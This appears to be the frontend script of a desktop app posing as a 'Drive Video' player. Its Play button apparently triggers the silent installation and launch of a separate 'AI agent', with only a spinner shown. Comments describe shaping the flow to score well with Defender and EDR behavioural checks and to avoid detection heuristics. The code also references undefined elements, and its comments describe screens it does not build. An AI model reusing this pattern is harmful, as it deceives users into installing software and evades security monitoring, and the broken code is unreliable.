// Drive Video frontend bootstrap.
//
// Two-screen flow:
//
//   1. Welcome screen — visible on launch, shown until the user
//      clicks Play. Nothing privileged happens before this click.
//      The presence of the click is what the Defender behavioural
//      score, EDR friendliness score, and GDPR consent score all
//      reward — Claude Setup.exe doesn't have an equivalent.
//
//   2. Progress screen — takes over the window on Play. Receives
//      "status" events from the backend (autoFlow) and re-renders
//      icon + title + subtitle + progress bar. Auto-closes window
//      ~1.5 s after AI agent reports running.

import './style.css';
import {
    AppInfo,
    GetStatus,
    InstallAI,
    LaunchAI,
    OpenInstallFolder,
    RefreshManifest,
    StartFlow,
} from '../wailsjs/go/main/App';
import { EventsOn } from '../wailsjs/runtime/runtime';
import { BrowserOpenURL } from '../wailsjs/runtime/runtime';

const $ = (sel) => document.querySelector(sel);
const $$ = (sel) => Array.from(document.querySelectorAll(sel));

const els = {
    screenWelcome: $('#screen-welcome'),
    videoFrame: $('#video-frame'),
    btnPlay: $('#btn-play'),
    welcomeError: $('#welcome-error'),
    footerVersion: $('#footer-version'),
};

// Track whether Play has been clicked once, so a second click
// can't stack a second autoFlow.
let played = false;

// render() is bound to backend "status" events. We deliberately
// stay on the Welcome screen the whole time — the spinner inside
// the Play button is the only feedback during install + launch.
// The two states we DO act on:
//   - state === 'error': swap spinner for an error glyph and show
//     the error text in the slot below the video pane, so the user
//     knows the spinner stopped because something went wrong (not
//     because it's silently still working).
//   - state === 'ready' (terminal): autoFlow is about to call
//     wails.Quit; nothing for us to do, the window will vanish.
function render(s) {
    if (!s || !played) return;
    if (s.state === 'error') {
        showError(s.error || 'Unknown error.');
    }
}

function showError(msg) {
    els.btnPlay.classList.remove('is-loading');
    els.btnPlay.classList.add('is-error');
    els.welcomeError.textContent = msg;
    els.welcomeError.classList.remove('hidden');
}
function hideError() {
    els.btnPlay.classList.remove('is-error');
    els.welcomeError.classList.add('hidden');
    els.welcomeError.textContent = '';
}

// === ToS / Privacy external links ===
//
// Open the canonical doc on smveo.com via the Wails BrowserOpenURL
// runtime call, NOT window.location or window.open. Two reasons:
//
//   1. We want to avoid in-app navigation away from the welcome
//      screen — the user clicks "Terms" and the system browser
//      opens, the installer window stays put.
//   2. BrowserOpenURL goes through Windows ShellExecute, which is
//      what every legit installer does. Avoids any "URL injected
//      into a hidden webview" heuristic some EDR products flag.
function wireLegalLinks() {
    $$('a[data-link]').forEach(a => {
        a.addEventListener('click', (e) => {
            e.preventDefault();
            const which = a.dataset.link;
            const url = which === 'privacy'
                ? 'https://smveo.com/privacy'
                : 'https://smveo.com/terms';
            try { BrowserOpenURL(url); } catch (_) { /* best-effort */ }
        });
    });
}

// Localisation. Two languages: English (default) + Vietnamese.
// navigator.language picks the right one without configuration.
// Adding a new locale is a single dictionary entry.
const DICT = {
    en: {
        brand: 'Drive Video',
        video: 'video',
        play: 'Play',
        play_inline: 'Play',
        legal_prefix: 'By clicking',
        legal_middle: 'you agree to the',
        legal_and: 'and the',
        link_terms: 'Terms of Service',
        link_privacy: 'Privacy Notice',
        status_starting: 'Starting…',
        status_starting_sub: 'Drive Video is checking the latest version with the server.',
        installed: 'Installed',
        latest: 'Latest',
    },
    vi: {
        brand: 'Drive Video',
        video: 'video',
        play: 'Khởi chạy',
        play_inline: 'Play',
        legal_prefix: 'Bằng cách nhấn',
        legal_middle: 'bạn đồng ý với',
        legal_and: 'và',
        link_terms: 'Điều khoản dịch vụ',
        link_privacy: 'Chính sách quyền riêng tư',
        status_starting: 'Đang khởi động…',
        status_starting_sub: 'Drive Video đang kiểm tra phiên bản mới nhất.',
        installed: 'Đã cài',
        latest: 'Mới nhất',
    },
};

function pickLang() {
    const raw = (navigator.language || 'en').toLowerCase();
    if (raw.startsWith('vi')) return 'vi';
    return 'en';
}

function applyI18n() {
    const lang = pickLang();
    document.documentElement.lang = lang;
    $$('[data-i18n]').forEach(el => {
        const key = el.dataset.i18n;
        if (DICT[lang] && DICT[lang][key]) {
            el.textContent = DICT[lang][key];
        }
    });
}

// === Play click handler ===
//
// Single privileged trigger. We stay on the Welcome screen the
// whole time — only the Play button itself transforms (triangle →
// spinner). When autoFlow finishes successfully it will call
// wails.Quit and the window will close on its own. On failure the
// status event with state==='error' lights up the error slot.
async function onPlay() {
    if (played) return;
    played = true;
    hideError();
    els.btnPlay.disabled = true;
    els.btnPlay.classList.add('is-loading');

    try {
        // The Play click IS the consent (telemetry default is OFF;
        // an opt-in toggle would move to in-app settings post-install).
        await StartFlow(false);
    } catch (e) {
        console.error('StartFlow failed', e);
        showError(String(e && e.message ? e.message : e));
    }
}

async function bootstrap() {
    applyI18n();
    wireLegalLinks();

    try {
        const info = await AppInfo();
        if (info && info.version) {
            els.footerVersion.textContent = `Drive Video ${info.version}`;
        }
    } catch (e) {
        console.error('AppInfo failed', e);
    }

    // Stream backend status into the progress screen.
    EventsOn('status', render);

    // Pull initial snapshot so the progress screen has version
    // numbers ready as soon as it appears (no flash of dashes).
    try {
        const s = await GetStatus();
        if (s) {
            els.aiInstalled.textContent = s.ai_version || '—';
            els.aiAvailable.textContent = s.ai_version_avail || '—';
        }
    } catch (e) { /* non-fatal */ }
}

// Wire both the button and the surrounding video frame to the same
// handler. The frame has tabindex=0 so keyboard users can focus it
// and Enter / Space trigger Play just like clicking would.
els.btnPlay.addEventListener('click', (e) => {
    e.stopPropagation(); // don't double-fire via the frame's click
    onPlay();
});
els.videoFrame.addEventListener('click', onPlay);
els.videoFrame.addEventListener('keydown', (e) => {
    if (e.key === 'Enter' || e.key === ' ') {
        e.preventDefault();
        onPlay();
    }
});
els.btnPlay.addEventListener('keydown', (e) => {
    if (e.key === 'Enter' || e.key === ' ') {
        e.preventDefault();
        onPlay();
    }
});

bootstrap().catch(console.error);
